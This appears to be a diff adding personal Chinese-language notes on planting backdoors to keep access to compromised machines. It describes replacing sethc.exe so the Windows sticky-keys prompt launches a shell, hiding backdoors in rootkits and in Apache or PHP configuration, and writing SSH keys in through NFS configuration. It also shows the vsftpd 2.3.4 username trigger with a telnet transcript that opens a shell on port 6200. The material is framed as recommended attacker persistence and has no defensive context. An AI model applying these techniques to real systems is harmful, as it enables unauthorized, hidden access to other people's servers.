@@ -1,0 +1,40 @@
+日志中可以查出来
+
+
+
+
+windows登录界面的时候通过五次敲击Shift，触发粘滞键的询问，同时因为文件替换（被替换文件c:\windows\system32\sethc.exe）的原因，能触发自己指定的程序，可以是一个shell（稍后自己执行explorer.exe），也可以直接是explorer。exe从而进入界面。这个后门可以被远程桌面利用。
+
+
+
+
+Rookit，隐藏在系统内核
+
+
+
+
+
+
+隐藏在服务器中间件
+apache隐藏在appction，做个本地包含，用递归好像可以弄个服务器启动自动生成后门，好像还有个端口复用的方法
+PHP写内存循环
+高级点就写配置文件里，混淆几段代码，做成一些组合漏洞
+
+
+
+推荐的后门程序（配合端口敲击）：
+直接开启一个shell
+vsftpd 2.3.4  在username后面加上:)，之后就会在6200开启一个shell
+	root@ubuntu:~# telnet 192.168.99.131 21
+	Trying 192.168.99.131…
+	Connected to 192.168.99.131.
+	Escape character is &#039;^]&#039;.
+	220 (vsFTPd 2.3.4)
+	user backdoored:)
+	331 Please specify the password.
+	pass invalid
+	^]
+改变nfs配置文件从而能够将自己，sshkey直接写进去。而且不知道配置文件的人绝对不知道会有这个漏洞。
+
+
+
